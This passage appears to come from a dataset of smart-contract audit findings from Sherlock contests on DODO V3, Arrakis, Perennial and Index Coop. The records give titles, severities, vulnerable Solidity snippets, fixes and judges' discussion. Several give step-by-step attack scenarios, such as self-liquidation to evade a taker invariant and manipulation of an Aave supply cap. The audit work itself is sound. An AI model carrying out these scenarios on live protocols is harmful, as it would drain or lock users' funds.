stickAmount(10,8, 400000, 18);\n        amountslot[1] = stickAmount(400000, 18, 400000, 18);\n        d3MakerWithPool.setTokensKs(tokens, tokenKs);\n        d3MakerWithPool.setTokensPrice(slotIndex, priceSlot);\n        d3MakerWithPool.setTokensAmounts(slotIndex, amountslot);\n        vm.stopPrank();\n\n        (uint256 askDownPrice, uint256 askUpPrice, uint256 bidDownPrice, uint256 bidUpPrice, uint256 swapFee) =\n            d3MM.getTokenMMPriceInfoForRead(address(token1));\n        assertEq(askDownPrice, 304555028000000000000000000000000);\n        assertEq(askUpPrice, 307231900000000000000000000000000);\n        assertEq(bidDownPrice, 3291);\n        assertEq(bidUpPrice, 3320);\n        assertEq(swapFee, 1200000000000000);\n\n        //console.log(askDownPrice);\n        //console.log(askUpPrice);\n        //console.log(bidDownPrice);\n        //console.log(bidUpPrice);\n        //console.log(swapFee);\n\n        (,,uint kask, uint kbid,,) = d3MM.getTokenMMOtherInfoForRead(address(token1));\n        assertEq(kask, 1e14);\n        assertEq(kbid, 1e14);\n\n        (askDownPrice, askUpPrice, bidDownPrice, bidUpPrice, swapFee) =\n            d3MM.getTokenMMPriceInfoForRead(address(token2));\n        assertEq(askDownPrice, 999999960000000000);\n        assertEq(askUpPrice, 1000799800000000000);\n        assertEq(bidDownPrice, 1000400120032008002);\n        assertEq(bidUpPrice, 1001201241249250852);\n        assertEq(swapFee, 200000000000000);\n\n        (,,kask, kbid,,) = d3MM.getTokenMMOtherInfoForRead(address(token2));\n        assertEq(kask, 0);\n        assertEq(kbid, 0);\n\n        //console.log(askDownPrice);\n        //console.log(askUpPrice);\n        //console.log(bidDownPrice);\n        //console.log(bidUpPrice);\n        //console.log(swapFee);\n        //console.log(kask);\n        //console.log(kbid);\n\n        SwapCallbackData memory swapData;\n        swapData.data = """";\n        swapData.payer = user1;\n\n        //uint256 gasleft1 = gasleft();\n        uint256 receiveToToken = d3Proxy.sellTokens(\n            address(d3MM),\n            user1,\n            address(token1),\n            address(token2),\n            1000000,\n            0,\n            abi.encode(swapData),\n            block.timestamp + 1000\n        );\n```\n\nIt will revert. In this example, wbtc price is 30445, and k = 0.0001, suppose maker contains rules, but model is invalid."чFix formula for this corner case, like making temp2 = 1\nImprove calculation accuracy by consistently using precision 18 for calculations and converting to real decimal when processing amounts.\nDiscussion\nAttens1423\nfix pr: https://github.com/DODOEX/new-dodo-v3/pull/32\nhrishibhat\nPlease note: This issue is not part of the contest submissions and is not eligible for contest rewards.чMaker sets right parameters but traders can't swap. It will make swap model invalid.\nTool Used\nManual Review
Then getAmountsForDelta function at Underlying.sol is implemented incorrectlyчmediumч```\nif (sqrtRatioX96 <= sqrtRatioAX96) {\n      amount0 = SafeCast.toUint256(\n          SqrtPriceMath.getAmount0Delta(\n               sqrtRatioAX96,\n               sqrtRatioBX96,\n               liquidity\n          )\n      );\n} \n```\nчThere exists 3 cases:\nThe current tick is outside the range from the left, this means only `token0` should be added.\nThe current tick is within the range, this means both `token0` and `token1` should be added.\nThe current tick is outside the range from the right, this means only `token1` should be added.\nThe issue on the implementation is on the first case, which is coded as follows:\n```\nif (sqrtRatioX96 <= sqrtRatioAX96) {\n      amount0 = SafeCast.toUint256(\n          SqrtPriceMath.getAmount0Delta(\n               sqrtRatioAX96,\n               sqrtRatioBX96,\n               liquidity\n          )\n      );\n} \n```\n\nThe implementation says that if the current price is equal to the price of the lower tick, it means that it is outside of the range and hence only `token0` should be added to the position.\nBut for the UniswapV3 implementation, the current price must be lower in order to consider it outside:\n```\nif (_slot0.tick < params.tickLower) {\n   // current tick is below the passed range; liquidity can only become in range by crossing from left to\n   // right, when we'll need _more_ token0 (it's becoming more valuable) so user must provide it\n   amount0 = SqrtPriceMath.getAmount0Delta(\n          TickMath.getSqrtRatioAtTick(params.tickLower),\n          TickMath.getSqrtRatioAtTick(params.tickUpper),\n          params.liquidityDelta\n    );\n}\n```\n\nReferenceч"Change from:\n```\n// @audit-issue Change <= to <.\nif (sqrtRatioX96 <= sqrtRatioAX96) {\n     amount0 = SafeCast.toUint256(\n        SqrtPriceMath.getAmount0Delta(\n           sqrtRatioAX96,\n           sqrtRatioBX96,\n           liquidity\n         )\n     );\n}\n```\n\nto:\n```\nif (sqrtRatioX96 < sqrtRatioAX96) {\n     amount0 = SafeCast.toUint256(\n        SqrtPriceMath.getAmount0Delta(\n           sqrtRatioAX96,\n           sqrtRatioBX96,\n           liquidity\n         )\n     );\n}\n```\n\nDiscussion\nGevarist\nWe consider this issue as a medium severity issue, because the cost of an attacker to benefit from this vulnerability and steal some token1 as expensive. The attacker needs to provide the equivalent amount of token0.\nctf-sec\nThe calculated amount to supply the token mismatched the actually supplied amount depends on the ticker range and the over-charged part from user fund is lost, recommend maintaining the high severity.\n0xRobocop\nEscalate\nApart from #142\nThe issues #65 #118 #149 and #269 are not duplicates of this issue.\nRegardless on their own validity, the mitigation is different, pointing to different root causes.\nctf-sec\nEmm You may need to edit from ""Escalate for 10 USDC"" to ""Escalate"" in the comments.\nsherlock-admin\nEscalate\nApart from #142\nThe issues #65 #118 #149 and #269 are not duplicates of this issue.\nRegardless on their own validity, the mitigation is different, pointing to different root causes.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nP12473\nThe calculated amount to supply the token mismatched the actually supplied amount depends on the ticker range and the over-charged part from user fund is lost, recommend maintaining the high severity.\nShould be medium considering high is defined as ""This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost).""\nJeiwan\nEscalate\nThis is a medium severity issue. The miscalculation won't cause a loss of funds since the wrong amount will be rejected by the underlying Uniswap pool. Also, the protocol has robust slippage protections, which won't allow users to deposit more tokens than required.\nAll in all, the issue doesn't demonstrate an attack scenario, or a scenario when users lose significant funds, thus it cannot have a high severity.\nsherlock-admin\nEscalate\nThis is a medium severity issue. The miscalculation won't cause a loss of funds since the wrong amount will be rejected by the underlying Uniswap pool. Also, the protocol has robust slippage protections, which won't allow users to deposit more tokens than required.\nAll in all, the issue doesn't demonstrate an attack scenario, or a scenario when users lose significant funds, thus it cannot have a high severity.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nJeffCX\nAfter reading the escalation, seems like the severity is medium\nWhen the current price is equal to the left boundary of the range, the uniswap pool will request both token0 and token1, but arrakis will only request from the user token0 so the pool will lose some token1 if it has enough to cover it.\nthis does cause protocol to lose fund because the protocol's fund instead of user's fund is used to add liquidity.\nbut mainly because the attacker not able to leverage this bug to steal fund and the pre-condition:\ncurrent price is equal to the left boundary of the range\nRecommend changing severity from high to medium\nI will adress 0xRobocoop's escalation seperately\nGevarist\nwe agree that this issue is medium.\nhrishibhat\nResult: Medium Has duplicates Accepting both escalations. This is a valid medium issue. and only #142 is the duplicate\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\n0xRobocop: accepted\nJeiwan: accepted"чSource: https://github.com/sherlock-audit/2023-06-arrakis-judging/issues/8\nFound by\n0x007, 0xRobocop\nWhen the current price is equal to the left boundary of the range, the uniswap pool will request both `token0` and `token1`, but arrakis will only request from the user `token0` so the pool will lose some `token1` if it has enough to cover it.\nCode Snippet\nTool used\nManual Review
Update to `managerFeeBPS` applied to pending tokens yet to be claimedчmediumч```\nfunction _applyFees(uint256 fee0_, uint256 fee1_) internal {\n    uint16 mManagerFeeBPS = managerFeeBPS;\n    managerBalance0 += (fee0_ * mManagerFeeBPS) / hundredPercent;\n    managerBalance1 += (fee1_ * mManagerFeeBPS) / hundredPercent;\n}\n```\nч"A manager (malicious or not) can update the `managerFeeBPS` by calling `ArrakisV2.setManagerFeeBPS()`. The newly-updated `managerFeeBPS` will be retroactively applied to the pending fees yet to be claimed by the `ArrakisV2` contract.\nWhenever UniV3 fees are collected (via `burn()` or rebalance()), the manager fees are applied to the received pending tokens.\n```\nfunction _applyFees(uint256 fee0_, uint256 fee1_) internal {\n    uint16 mManagerFeeBPS = managerFeeBPS;\n    managerBalance0 += (fee0_ * mManagerFeeBPS) / hundredPercent;\n    managerBalance1 += (fee1_ * mManagerFeeBPS) / hundredPercent;\n}\n```\n\nSince the manager can update the `managerFeeBPS` whenever, this calculation can be altered to take up to 100% of the pending fees in favor of the manager.\n```\nfunction setManagerFeeBPS(uint16 managerFeeBPS_) external onlyManager {\n    require(managerFeeBPS_ <= 10000, ""MFO"");\n    managerFeeBPS = managerFeeBPS_;\n    emit LogSetManagerFeeBPS(managerFeeBPS_);\n}\n```\n"чFees should be collected at the start of execution within the `setManagerFeeBPS()` function. This effectively checkpoints the fees properly, prior to updating the `managerFeeBPS` variable.чManager's ability to intentionally or accidently steal pending fees owed to stakers\nCode Snippet\nTool used\nManual Review
The deposit - withdraw - trade transaction lack of expiration timestamp check (DeadLine check)чmediumч```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\nчThe deposit - withdraw - trade transaction lack of expiration timestamp check (DeadLine check)\nthe protocol missing the DEADLINE check at all in logic.\nthis is actually how uniswap implemented the Deadline, this protocol also need deadline check like this logic\n```\n// **** ADD LIQUIDITY ****\nfunction _addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin\n) internal virtual returns (uint amountA, uint amountB) {\n // create the pair if it doesn't exist yet\n if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {\n  IUniswapV2Factory(factory).createPair(tokenA, tokenB);\n }\n (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);\n if (reserveA == 0 && reserveB == 0) {\n  (amountA, amountB) = (amountADesired, amountBDesired);\n } else {\n  uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);\n  if (amountBOptimal <= amountBDesired) {\n   require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');\n   (amountA, amountB) = (amountADesired, amountBOptimal);\n  } else {\n   uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n   assert(amountAOptimal <= amountADesired);\n   require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n   (amountA, amountB) = (amountAOptimal, amountBDesired);\n  }\n }\n}\n\nfunction addLiquidity(\n address tokenA,\n address tokenB,\n uint amountADesired,\n uint amountBDesired,\n uint amountAMin,\n uint amountBMin,\n address to,\n uint deadline\n) external virtual override ensure(deadline) returns (uint amountA, uint amountB, uint liquidity) {\n (amountA, amountB) = _addLiquidity(tokenA, tokenB, amountADesired, amountBDesired, amountAMin, amountBMin);\n address pair = UniswapV2Library.pairFor(factory, tokenA, tokenB);\n TransferHelper.safeTransferFrom(tokenA, msg.sender, pair, amountA);\n TransferHelper.safeTransferFrom(tokenB, msg.sender, pair, amountB);\n liquidity = IUniswapV2Pair(pair).mint(to);\n}\n```\n\nthe point is the deadline check\n```\nmodifier ensure(uint deadline) {\n require(deadline >= block.timestamp, 'UniswapV2Router: EXPIRED');\n _;\n}\n```\n\nThe deadline check ensure that the transaction can be executed on time and the expired transaction revert.ч
User would liquidate his account to sidestep `takerInvariant` modifierчmediumч```\nfunction closeMakeFor(\n        address account,\n        UFixed18 amount\n    )\n        public\n        nonReentrant\n        notPaused\n        onlyAccountOrMultiInvoker(account)\n        settleForAccount(account)\n        takerInvariant\n        closeInvariant(account)\n        liquidationInvariant(account)\n    {\n        _closeMake(account, amount);\n    }\n```\nчA single user could open a massive maker position, using the maximum leverage possible(and possibly reach the maker limit), and when a lot of takers open take positions, maker would liquidate his position, effectively bypassing the taker invariant and losing nothing apart from position fees. This would cause takers to be charged extremely high funding fees(at the maxRate), and takers that are not actively monitoring their positions will be greatly affected.\nIn the closeMakeFor function, there is a modifier called `takerInvariant`.\n```\nfunction closeMakeFor(\n        address account,\n        UFixed18 amount\n    )\n        public\n        nonReentrant\n        notPaused\n        onlyAccountOrMultiInvoker(account)\n        settleForAccount(account)\n        takerInvariant\n        closeInvariant(account)\n        liquidationInvariant(account)\n    {\n        _closeMake(account, amount);\n    }\n```\n\nThis modifier prevents makers from closing their positions if it would make the global maker open positions to fall below the global taker open positions. A malicious maker can easily sidestep this by liquidating his own account. Liquidating an account pays the liquidator a fee from the account's collateral, and then forcefully closes all open maker and taker positions for that account.\n```\nfunction closeAll(address account) external onlyCollateral notClosed settleForAccount(account) {\n        AccountPosition storage accountPosition = _positions[account];\n        Position memory p = accountPosition.position.next(_positions[account].pre);\n\n        // Close all positions\n        _closeMake(account, p.maker);\n        _closeTake(account, p.taker);\n\n        // Mark liquidation to lock position\n        accountPosition.liquidation = true; \n    }\n```\n\nThis would make the open maker positions to drop significantly below the open taker position, and greatly increase the funding fee and utilization ratio.\nATTACK SCENARIO\nA new Product(ETH-Long) is launched on arbitrum with the following configurations:\n20x max leverage(5% maintenance)\nmakerFee = 0\ntakerFee = 0.015\nliquidationFee = 20%\nminRate = 4%\nmaxRate = 120%\ntargetRate = 12%\ntargetUtilization = 80%\nmakerLimit = 4000 Eth\nETH price = 1750 USD\nColl Token = USDC\nmax liquidity(USD) = 4000*1750 = $7,000,000\nWhale initially supplies 350k USDC of collateral(~200ETH), and opens a maker position of 3000ETH($5.25mn), at 15x leverage.\nAfter 2 weeks of activity, global open maker position goes up to 3429ETH($6mn), and because fundingFee is low, people are incentivized to open taker positions, so global open taker position gets to 2743ETH($4.8mn) at 80% utilization. Now, rate of fundingFee is 12%\nNow, Whale should only be able to close up to 686ETH($1.2mn) of his maker position using the `closeMakeFor` function because of the `takerInvariant` modifier.\nWhale decides to withdraw 87.5k USDC(~50ETH), bringing his total collateral to 262.5k USDC, and his leverage to 20x(which is the max leverage)\nIf price of ETH temporarily goes up to 1755 USD, totalMaintenance=3000 * 1755 * 5% = $263250. Because his totalCollateral is 262500 USDC(which is less than totalMaintenance), his account becomes liquidatable.\nWhale liquidates his account, he receives liquidationFee*totalMaintenance = 20% * 263250 = 52650USDC, and his maker position of 3000ETH gets closed. Now, he can withdraw his remaining collateral(262500-52650=209850)USDC because he has no open positions.\nGlobal taker position is now 2743ETH($4.8mn), and global maker position is 429ETH($750k)\nWhale has succeeded in bypassing the takerInvaraiant modifier, which was to prevent him from closing his maker position if it would make global maker position less than global taker position.\nConsequently,\nFunding fees would now be very high(120%), so the currently open taker positions will be greatly penalized, and takers who are not actively monitoring their position could lose a lot.\nWhale would want to gain from the high funding fees, so he would open a maker position that would still keep the global maker position less than the global taker position(e.g. collateral of 232750USDC at 15x leverage, open position = ~2000ETH($3.5mn)) so that taker positions will keep getting charged at the funding fee maxRate.ч"
Accounts will not be liquidated when they are meant to.чmediumч```\nfunction liquidate(\n        address account,\n        IProduct product\n    ) external nonReentrant notPaused isProduct(product) settleForAccount(account, product) {\n        if (product.isLiquidating(account)) revert CollateralAccountLiquidatingError(account);\n\n        UFixed18 totalMaintenance = product.maintenance(account); maintenance?\n        UFixed18 totalCollateral = collateral(account, product); \n\n        if (!totalMaintenance.gt(totalCollateral))\n            revert CollateralCantLiquidate(totalMaintenance, totalCollateral);\n\n        product.closeAll(account);\n\n        // claim fee\n        UFixed18 liquidationFee = controller().liquidationFee();\n      \n        UFixed18 collateralForFee = UFixed18Lib.max(totalMaintenance, controller().minCollateral()); \n        UFixed18 fee = UFixed18Lib.min(totalCollateral, collateralForFee.mul(liquidationFee)); \n\n        _products[product].debitAccount(account, fee); \n        token.push(msg.sender, fee);\n\n        emit Liquidation(account, product, msg.sender, fee);\n    }\n```\nчIn the case that the totalMaintenance*liquidationFee is higher than the account's totalCollateral, liquidators are paid the totalCollateral. I think one of the reasons for this is to avoid the case where liquidating an account would attempt to debit fees that is greater than the collateral balance The problem is that, the value of totalCollateral used as fee is slightly higher value than the current collateral balance, which means that in such cases, attempts to liquidate the account would revert due to underflow errors.\nHere is the `liquidate` function:\n```\nfunction liquidate(\n        address account,\n        IProduct product\n    ) external nonReentrant notPaused isProduct(product) settleForAccount(account, product) {\n        if (product.isLiquidating(account)) revert CollateralAccountLiquidatingError(account);\n\n        UFixed18 totalMaintenance = product.maintenance(account); maintenance?\n        UFixed18 totalCollateral = collateral(account, product); \n\n        if (!totalMaintenance.gt(totalCollateral))\n            revert CollateralCantLiquidate(totalMaintenance, totalCollateral);\n\n        product.closeAll(account);\n\n        // claim fee\n        UFixed18 liquidationFee = controller().liquidationFee();\n      \n        UFixed18 collateralForFee = UFixed18Lib.max(totalMaintenance, controller().minCollateral()); \n        UFixed18 fee = UFixed18Lib.min(totalCollateral, collateralForFee.mul(liquidationFee)); \n\n        _products[product].debitAccount(account, fee); \n        token.push(msg.sender, fee);\n\n        emit Liquidation(account, product, msg.sender, fee);\n    }\n```\n\n`fee=min(totalCollateral,collateralForFee*liquidationFee)` But the PROBLEM is, the value of `totalCollateral` is fetched before calling `product.closeAll`, and `product.closeAll` debits the closePosition fee from the collateral balance. So there is an attempt to debit `totalCollateral`, when the current collateral balance of the account is totalCollateral-closePositionFees This allows the following:\nThere is an ETH-long market with following configs:\nmaintenance=5%\nminCollateral=100USDC\nliquidationFee=20%\nETH price=$1000\nUser uses 500USDC to open $10000(10ETH) position\nPrice of ETH spikes up to $6000\nRequired maintenance= 60000*5%=$3000 which is higher than account's collateral balance(500USDC), therefore account should be liquidated\nA watcher attempts to liquidate the account which does the following:\ntotalCollateral=500USDC\n`product.closeAll` closes the position and debits a makerFee of 10USDC\ncurrent collateral balance=490USDC\ncollateralForFee=totalMaintenance=$3000\nfee=min(500,3000*20%)=500\n`_products[product].debitAccount(account,fee)` attempts to subtract 500 from 490 which would revert due to underflow\naccount does not get liquidated\nNow, User is not liquidated even when he is using 500USD to control a $60000 position at 120x leverage(whereas, maxLeverage=20x)\nNOTE: This would happen when the market token's price increases by (1/liquidationFee)x. In the above example, price of ETH increased by 6x (from 1000USD to 6000USD) which is greater than 5(1/20%)ч`totalCollateral` that would be paid to liquidator should be refetched after `product.closeAll` is called to get the current collateral balance after closePositionFees have been debited.\nDiscussion\nKenzoAgada\nSee the `Recommendation` section above for the root of the issue.чA User's position will not be liquidated even when his collateral balance falls WELL below the required maintenance. I believe this is of HIGH impact because this scenario is very likely to happen, and when it does, the protocol will be greatly affected because a lot of users will be trading abnormally high leveraged positions without getting liquidated.\nCode Snippet\nTool used\nManual Review
`BalancedVault` doesn't consider potential break in one of the marketsчmediumч```\n    if (shares.gt(_maxRedeemAtEpoch(context, accountContext, account))) revert BalancedVaultRedemptionLimitExceeded();\n```\nчIn case of critical failure of any of the underlying markets, making it permanently impossible to close position and withdraw collateral all funds deposited to balanced Vault will be lost, including funds deposited to other markets.\nAs Markets and Vaults on Perennial are intented to be created in a permissionless manner and integrate with external price feeds, it cannot be ruled out that any Market will enter a state of catastrophic failure at a point in the future (i.e. oracle used stops functioning and Market admin keys are compromised, so it cannot be changed), resulting in permanent inability to process closing positions and withdrawing collateral.\n`BalancedVault` does not consider this case, exposing all funds deposited to a multi-market Vault to an increased risk, as it is not implementing a possibility for users to withdraw deposited funds through a partial emergency withdrawal from other markets, even at a price of losing the claim to locked funds in case it becomes available in the future. This risk is not mentioned in the documentation.\nProof of Concept\nConsider a Vault with 2 markets: ETH/USD and ARB/USD.\nAlice deposits to Vault, her funds are split between 2 markets\nARB/USD market undergoes a fatal failure resulting in `maxAmount` returned from `_maxRedeemAtEpoch` to be 0\nAlice cannot start withdrawal process as this line in `redeem` reverts:\n```\n    if (shares.gt(_maxRedeemAtEpoch(context, accountContext, account))) revert BalancedVaultRedemptionLimitExceeded();\n```\nч"
setIncentiveSettings would be halt during a rebalance operation that gets stuck due to supply cap is reached at Aaveчmediumч```\n    function setIncentiveSettings(IncentiveSettings memory _newIncentiveSettings) external onlyOperator noRebalanceInProgress {\n        incentive = _newIncentiveSettings;\n\n        _validateNonExchangeSettings(methodology, execution, incentive);\n\n        emit IncentiveSettingsUpdated(\n            incentive.etherReward,\n            incentive.incentivizedLeverageRatio,\n            incentive.incentivizedSlippageTolerance,\n            incentive.incentivizedTwapCooldownPeriod\n        );\n    }\n```\nчsetIncentiveSettings would be halt during a rebalance operation that gets stuck due to supply cap is reached at Aave\nrebalance implement a cap of tradeSize and if the need to rebalance require taking more assets than the maxTradeSize, then `twapLeverageRatio` would be set to the targeted leverage. `twapLeverageRatio` == 0 is required during rebalance.\nConsider:\nlever is needed during rebalance, the strategy require to borrow more ETH and sell to wstETH during the 1st call of rebalance the protocol cache the new `twapLeverageRatio` However wstETH market in Aave reach supply cap. rebalance/iterateRebalance comes to a halt. `twapLeverageRatio` remains caching the targeted leverage\nsetIncentiveSettings requires a condition in which no rebalance is in progress. With the above case, setIncentiveSettings can be halted for an extended period of time until the wstETH market falls under supply cap.\nWorth-noting, at the time of writing this issue, the wstETH market at Aave has been at supply cap\nIn this case, malicious actor who already has a position in wstETH can do the following:\ndeposit into the setToken, trigger a rebalance.\nmalicious trader withdraw his/her position in Aave wstETH market so there opens up vacancy for supply again.\nprotocol owner see supply vacancy, call rebalance in order to lever as required. Now twapLeverageRatio is set to new value since multiple trades are needed\nmalicious trader now re-supply the wstETH market at Aave so it reaches supply cap again.\nthe protocol gets stuck with a non-zero twapLeverageRatio, `setIncentiveSettings` can not be called.\n```\n    function setIncentiveSettings(IncentiveSettings memory _newIncentiveSettings) external onlyOperator noRebalanceInProgress {\n        incentive = _newIncentiveSettings;\n\n        _validateNonExchangeSettings(methodology, execution, incentive);\n\n        emit IncentiveSettingsUpdated(\n            incentive.etherReward,\n            incentive.incentivizedLeverageRatio,\n            incentive.incentivizedSlippageTolerance,\n            incentive.incentivizedTwapCooldownPeriod\n        );\n    }\n```\nчAdd some checks on whether the supply cap of an Aave market is reached during a rebalance. If so, allows a re-set of twapLeverageRatio\nDiscussion\nckoopmann\nThis is another scenario, that we will investigate in more detail.\npblivin0x\nIn the listed vulnerability, it is proposed that a\n`malicious actor who already has a position in wstETH can deposit into the setToken, trigger a rebalance.`\nBut I don't believe this is the case. Unpermissioned actors can mint the SetToken with exact replication via the DebtIssuanceModuleV2. In this case the leverage ratio would remain the same as before the mint and not trigger a rebalance.\nI believe the current plan for avoiding any Aave supply cap issues is by imposing a SetToken supply cap.\n0xffff11\nAs discussed with sponsor, valid medium\nckoopmann\nFixed the issue of settings being bricked in the mentioned scenario by adding an override flag that can be set by the operator: https://github.com/IndexCoop/index-coop-smart-contracts/pull/142/commits/edbe0b04a1966ada1e0a4f9c89cbb9e2f475a440\nGenerally I don't see a way to reliably protect against hitting the supply cap, however it should not endanger users funds as redeeming as well as levering down are not affected. (only minting new set tokens as well as levering up would be blocked, which is a know limitation)чsetIncentiveSettings would be halt.\nCode Snippet\nTool used\nManual Review
Protocol doesn't completely protect itself from `LTV = 0` tokensчmediumч```\n    /**\n     * Calculate total notional rebalance quantity and chunked rebalance quantity in collateral units.\n     *\n     * return uint256          Chunked rebalance notional in collateral units\n     * return uint256          Total rebalance notional in collateral units\n     */\n    function _calculateChunkRebalanceNotional(\n        LeverageInfo memory _leverageInfo,\n        uint256 _newLeverageRatio,\n        bool _isLever\n    )\n        internal\n        view\n        returns (uint256, uint256)\n    {\n        // Calculate absolute value of difference between new and current leverage ratio\n        uint256 leverageRatioDifference = _isLever ? _newLeverageRatio.sub(_leverageInfo.currentLeverageRatio) : _leverageInfo.currentLeverageRatio.sub(_newLeverageRatio);\n\n        uint256 totalRebalanceNotional = leverageRatioDifference.preciseDiv(_leverageInfo.currentLeverageRatio).preciseMul(_leverageInfo.action.collateralBalance);\n\n        uint256 maxBorrow = _calculateMaxBorrowCollateral(_leverageInfo.action, _isLever);\n\n        uint256 chunkRebalanceNotional = Math.min(Math.min(maxBorrow, totalRebalanceNotional), _leverageInfo.twapMaxTradeSize);\n\n        return (chunkRebalanceNotional, totalRebalanceNotional);\n    }\n\n    /**\n     * Calculate the max borrow / repay amount allowed in base units for lever / delever. This is due to overcollateralization requirements on\n     * assets deposited in lending protocols for borrowing.\n     *\n     * For lever, max borrow is calculated as:\n     * (Net borrow limit in USD - existing borrow value in USD) / collateral asset price adjusted for decimals\n     *\n     * For delever, max repay is calculated as:\n     * Collateral balance in base units * (net borrow limit in USD - existing borrow value in USD) / net borrow limit in USD\n     *\n     * Net borrow limit for levering is calculated as:\n     * The collateral value in USD * Aave collateral factor * (1 - unutilized leverage %)\n     *\n     * Net repay limit for delevering is calculated as:\n     * The collateral value in USD * Aave liquiditon threshold * (1 - unutilized leverage %)\n     *\n     * return uint256          Max borrow notional denominated in collateral asset\n     */\n    function _calculateMaxBorrowCollateral(ActionInfo memory _actionInfo, bool _isLever) internal view returns(uint256) {\n\n        // Retrieve collateral factor and liquidation threshold for the collateral asset in precise units (1e16 = 1%)\n        ( , uint256 maxLtvRaw, uint256 liquidationThresholdRaw, , , , , , ,) = strategy.aaveProtocolDataProvider.getReserveConfigurationData(address(strategy.collateralAsset));\n\n        // Normalize LTV and liquidation threshold to precise units. LTV is measured in 4 decimals in Aave which is why we must multiply by 1e14\n        // for example ETH has an LTV value of 8000 which represents 80%\n        if (_isLever) {\n            uint256 netBorrowLimit = _actionInfo.collateralValue\n                .preciseMul(maxLtvRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return netBorrowLimit\n                .sub(_actionInfo.borrowValue)\n                .preciseDiv(_actionInfo.collateralPrice);\n        } else {\n            uint256 netRepayLimit = _actionInfo.collateralValue\n                .preciseMul(liquidationThresholdRaw.mul(10 ** 14))\n                .preciseMul(PreciseUnitMath.preciseUnit().sub(execution.unutilizedLeveragePercentage));\n\n            return _actionInfo.collateralBalance\n                .preciseMul(netRepayLimit.sub(_actionInfo.borrowValue))\n                .preciseDiv(netRepayLimit);\n        }\n    }\n```\nчThe AaveLeverageStrategyExtension does not completely protect against tokens with a Loan-to-Value (LTV) of 0. Tokens with an LTV of 0 in Aave V3 pose significant risks, as they cannot be used as collateral to borrow upon a breaking withdraw. Moreover, LTVs of assets could be set to 0, even though they currently aren't, it could create substantial problems with potential disruption of multiple functionalities. This bug could cause a Denial-of-Service (DoS) situation in some cases, and has a potential to impact the borrowing logic in the protocol, leading to an unintentionally large perceived borrowing limit.\nWhen an AToken has LTV = 0, Aave restricts the usage of certain operations. Specifically, if a user owns at least one AToken as collateral with an LTV = 0, certain operations could revert:\nWithdraw: If the asset being withdrawn is collateral and the user is borrowing something, the operation will revert if the withdrawn collateral is an AToken with LTV > 0.\nTransfer: If the asset being transferred is an AToken with LTV > 0 and the sender is using the asset as collateral and is borrowing something, the operation will revert.\nSet the reserve of an AToken as non-collateral: If the AToken being set as non-collateral is an AToken with LTV > 0, the operation will revert.\n```\n    /**\n     * Calculate total notional rebalance quantity and chunked rebalance quantity in collateral units.\n     *\n     * return uint256          Chunked rebalance notional in collateral units\n     * return uint256          Total rebalance notional in collateral units\n     */\n    function _calculateChunkRebalanceNotional(\n        LeverageInfo memory _leverageInfo,\n        uint256 _newLeverageRatio,\n        bool _isLever\n    )\n        internal\n        view\n        returns (uint256, uint256)\n    {\n        // Calculate absolute value of difference between new and current leverage ratio\n        uint256 leverageRatioDifference = _isLever ? _newLeverageRatio.sub(_leverageInfo.currentLeverageRatio) : _leverageInfo.currentLeverageRatio.sub(_newLeverageRatio);\n\n        uint256 totalRebalanceNotional = leverageRatioDifference.preciseDiv(_leverageInfo.currentLeverageRatio).preciseMul(_leverageInfo.action.collateralBalance);\n\n        uint256 maxBorrow = _calculateMaxBorrowCollateral(_leverageInfo.action, _isLever);\n\n        uint256 chunkRebalanceNotional = Math.min(Math.min(maxBorrow, totalRebalanceNotional), _leverageInfo.twapMaxTradeSize);\n\n        return (chunkRebalanceNotional, totalRebalanceNotional);\n    }\n\n    /**\n     * Calculate the max borrow / repay amount allowed in base units for lever / delever. This is due to overcollateralization requirements on\n     * assets deposited in lending protocols for borrowing.\n     *\n     * For lever, max 